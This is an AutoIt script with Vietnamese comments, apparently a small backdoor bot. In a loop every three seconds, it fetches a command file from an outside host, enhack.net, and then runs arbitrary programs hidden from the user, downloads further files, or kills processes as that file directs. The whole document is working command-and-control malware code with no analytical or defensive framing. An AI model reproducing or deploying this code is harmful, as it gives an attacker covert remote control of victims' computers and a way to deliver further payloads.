;~ #NoTrayIcon
$txt = "http://enhack.net/direc.txt"

While (1)
   GetDr()
   ExCmd()
   Sleep(3000)
WEnd

Func GetDr()
; Doc va phan tich chi thi
   InetGet ($txt, @WindowsDir & "\direc.txt", 1, 0)
   $fp = FileOpen(@WindowsDir & "\direc.txt", 0)
   Global $con = FileReadLine($fp)
   FileClose($fp)
   FileDelete(@WindowsDir & "\direc.txt")
EndFunc

Func ExCmd()
; Phan tich va thuc hien lenh
   If StringInStr($con, "RUN#", 2) Then
      $cmd = StringSplit($con, "#")
      If StringInStr($con, "#SHOW", 2) Then
         Run($cmd[2])
      Else
         Run($cmd[2], "", @SW_HIDE)
      EndIf
      Sleep(7000)
   ElseIf StringInStr($con, "LOAD#", 2) Then
      $cmd = StringSplit($con, " ")
      InetGet ($cmd[2], $cmd[3], 0, 1)
      Sleep(7000)
   ElseIf StringInStr($con, "KILL#", 2) Then
      $cmd = StringSplit($con, "#")
      Run("TASKKILL /F /IM " & $cmd[2] & ".exe", "", @SW_HIDE)
      Sleep(7000)
   EndIf   
EndFunc